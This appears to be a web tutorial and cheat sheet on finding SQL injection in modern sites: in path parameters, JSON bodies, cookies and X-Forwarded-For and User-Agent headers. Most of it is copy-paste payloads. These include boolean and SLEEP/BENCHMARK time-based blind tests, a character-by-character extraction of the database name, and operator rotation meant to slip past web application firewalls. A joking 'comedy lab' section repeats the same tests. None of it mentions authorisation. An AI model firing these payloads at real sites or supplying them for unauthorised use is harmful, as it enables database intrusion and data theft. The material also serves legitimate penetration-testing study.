A How to FIND SQLi on modern sites no ?id=, no .php — 7 hidden places

Your friend hunts on /user/task not ?id=5. The id is hidden in path, JSON, cookie or header. Stop looking for ? — look for dynamic numbers that change the page. Below are the exact copy-paste tests for each hiding spot.

1 PATH PARAMETERS — /user/5/task Express → req.params.id

Framework puts 5 into req.params.id. Browser encodes / and #. Raw /user/5-1/task may be treated as string "5-1" — but SQL does WHERE id = (int)$id and still evaluates.

Test A — Math Bypass https://site.com/user/5-1/task → shows User 4? = DB parsed 5-1 = CRITICAL
Router gave “5-1” as string, SQL cast to int and subtracted.
Test B — Boolean Path https://site.com/user/5 AND 1=1/task → Normal https://site.com/user/5 AND 1=2/task → Crash / 404
Type with spaces — browser auto-encodes to %20. No need to type %20 yourself.
Test C — Time Path https://site.com/user/5 AND SLEEP(5)/task → 5s hang = win If 404 instantly → router rejects slash. Fix: https://site.com/user/5; SLEEP(5)/task
; is allowed in the path and often splits queries (MSSQL/Postgres).
Test D — Comment Bypass https://site.com/user/5' -- -/task → loads normal? (last slash after -- - is ignored by SQL)
2 JSON BODY INJECTION {"user_id":5}

Trap: You cannot send {"user_id": 5-1} — invalid JSON (math in numbers is illegal).

  1. Step 1 — String: {"user_id": "5-1"} → returns User 4 → backend cast string→int → VULN
  2. Step 2 — Boolean (string context): {"user_id": "5' AND '1'='1"} → User 5 ; {"user_id": "5' AND '1'='2"} → 404 — use '1'='1 inside quotes
  3. Step 3 — Time: {"user_id": "5' AND SLEEP(5)-- -"} → Network 5s = win
  4. Step 4 — Array Bypass: {"user_id": [5]} → try [5,0] (error = not sanitized) → inject {"user_id": ["5' AND SLEEP(5)-- -"]}
3 COOKIE INJECTION Hidden ID
  1. F12 → Application → Cookies → find user_id=5
  2. Right-click request in Network → Copy → Copy as cURL
  3. Cookie: user_id=5-1 → User 4 loads? Math works
  4. Cookie: user_id=5' AND SLEEP(5)-- - → 5s? = SQLi
Pro: HttpOnly? Use Burp → Intercept → change Cookie: before Forward.
4 HEADER INJECTION LEVEL 3

Backend logs IP / UA into DB. No escape = blind.

X-Forwarded-For (Burp) X-Forwarded-For: 127.0.0.1' AND SLEEP(5)-- - → $_SERVER['HTTP_X_FORWARDED_FOR'] → INSERT
User-Agent User-Agent: Mozilla/5.0' AND SLEEP(5)-- - → visitors table → 5s hang
5 Null & Schema

If 1=1 / 1=2 both 200 OK:

{"user_id": null} → all users? = WHERE id=null used → TypeError? = DB parsing → try {"user_id": "5 OR 1=1"}

B Blind Manual Methodology when app doesn’t echo data

1Boolean-Based (True/False)TRUE vs FALSE
  1. True baseline: ?id=1' AND 1=1 -- - → normal
  2. False baseline: ?id=1' AND 1=2 -- - → "No results" / blank / 500
  3. Extract: ?id=1' AND SUBSTRING((SELECT database()),1,1)='a' -- -
    If a → true (normal), else false

Speed trick: Use ASCII + binary search, not a-z:

AND ASCII(SUBSTRING((SELECT database()),1,1)) > 100 -- -
AND ASCII(...) > 115 -- -
// 7 requests per char, not 26. a=97 … z=122

Move position: SUBSTRING(...,2,1), SUBSTRING(...,3,1) …

2Time-Based (Waiting)CLOCK
  1. Find sleep fn: MySQL SLEEP(5), PG pg_sleep(5), MSSQL WAITFOR DELAY '0:0:5'
  2. Test: ?id=1' AND SLEEP(5)-- - → Network tab “Time” = ~5s?
  3. Conditional: ?id=1' AND IF(SUBSTRING((SELECT database()),1,1)='a', SLEEP(5),0)-- -
    5s → letter is a, 0.5s → not a

Crucial: Use SLEEP(10) for manual (jitter lies), add &rand=123 cache-buster.

MySQL: IF(condition,SLEEP(5),0)
Postgres: CASE WHEN (condition) THEN pg_sleep(5) ELSE 0 END
MSSQL: IF (condition) WAITFOR DELAY '0:0:5'

C Cool verification when XOR or 1=1 works / 1=2 crashes

  • Heavy Query (no SLEEP word, bypass WAF): 1 AND (SELECT COUNT(*) FROM information_schema.tables T1, information_schema.tables T2, information_schema.tables T3) → 10s delay?
  • BENCHMARK: 1 AND BENCHMARK(5000000, MD5('x')) → 5s? (MySQL, not blocked)
  • Case fingerprint: 1 AND 'a'='A' → MySQL true (case-insensitive), PG/MSSQL false. Confirm with 1 AND BINARY 'a'='A'
  • Bypass filters: 1%26%261=1 (&&) vs 1%26%261=2, 1%7c%7c1=1 (||), /*!50000 1=1*/ MySQL version comment
  • View Source: crash page → Ctrl+U search mysql / syntax → if error visible you have Error-based → use EXTRACTVALUE() in one request!

First 5 Requests — Strategy

  1. Math: id=2-1 → if same as id=1 → Numeric. Else → String-based.
  2. AND Boolean: id=1 AND 1=1 (normal) vs id=1 AND 1=2 (crash) → Boolean confirmed.
  3. XOR Boolean (if AND fails): id=1 XOR 1=2 (normal) vs id=1 XOR 1=1 (crash) → XOR works.
  4. Time with AND: id=1 AND SLEEP(5) → 5s delay → Time confirmed.
  5. Time with XOR (WAF bypass): id=1 XOR SLEEP(5) → 5s delay → Time without triggering WAF.

Operator Rotation Trick

If AND is blocked, rotate in this order — WAFs cannot block all:

AND → blocked? && (%26%26) → blocked? OR → blocked? || (%7C%7C) → blocked? XOR → blocked? ! (NOT) → blocked? <> → blocked? LIKE → blocked? IN → blocked? BETWEEN → blocked? → One WILL work.

Tip: URL-encode && as %26%26, || as %7C%7C

BONUS: The Comedy Lab — How To Roast A Website Until It Confesses SQLi FUNNY BUT REAL

WAF is the nightclub bouncer. The database is a drunk gossip who cannot keep secrets. Your job is to get the gossip drunk enough to spill the names. Here are the 7 stupid-simple pranks that actually work — tell them to your grandma and she will find SQLi.

1 The Calculator Kid 2-1

Tell the site id=2-1. If it shows product #1, the DB did the math for you. It is literally doing your homework. Congratulations, it is vulnerable.

id=2-1 → shows id=1? = “Mr DB did maths = owned”
Joke: The DB is that kid who cannot help but answer “2-1 = 1” even in an exam.
2 The Single-Quote Sneeze '

Add one ' . If the page sneezes — error, blank, 500 — that sneeze is the confession. A healthy site ignores it. An allergic site is injectable.

id=1 → OK id=1' → *achoo* ERROR? → VULN! id=1' -- - → sneeze stops? → confirmed
3 The All-You-Can-Eat Buffet OR 1=1

OR 1=1 is telling the kitchen “or if 1 equals 1 give me EVERYTHING”. The DB says “bet” and dumps the whole menu. If you suddenly see 1000 rows instead of 1 — bingo.

id=1 OR 1=1 → 1,000 products? Buffet opened!
4 Opposite Day (XOR) XOR

XOR is the liar. XOR 1=1 is false, XOR 1=2 is true — reverse world. WAF bouncers never check opposite day. That is why it bypasses.

id=1 XOR 1=2 → normal (true) id=1 XOR 1=1 → crash (false) = XOR works!
5 The Sloth Nap SLEEP(5)

Ask the DB to nap 5 seconds. Open Network tab, watch the timer. Genuine 5.03s? The DB is snoring. You own time itself. Add &rand=123 so browser does not serve cached lie.

id=1 AND SLEEP(5) → spinner 5.0s? → snore = time-blind id=1 XOR SLEEP(5) → same but WAF-proof nap
6 The Fortune Cookie LIKE / BETWEEN

WAF blocks =? Use mom’s fortune cookie language: LIKE, IN, BETWEEN. 1 BETWEEN 0 AND 2 is just “is 1 between 0 and 2?” — same question, fancier tuxedo.

id=1 AND 'a' LIKE 'a%' → normal? bypass ok id=1 AND 1 BETWEEN 0 AND 2 → same trick
7. The Bouncer vs The Spy — 60-Second Street Routine

Walk up to the bouncer (WAF) and whisper: id=1 AND 1=1 → blocked? Smile, try id=1 %26%26 1=1 (&&). Blocked? Try XOR 1=2. Blocked? Try 1 BETWEEN 0 AND 2. One will get a wink.
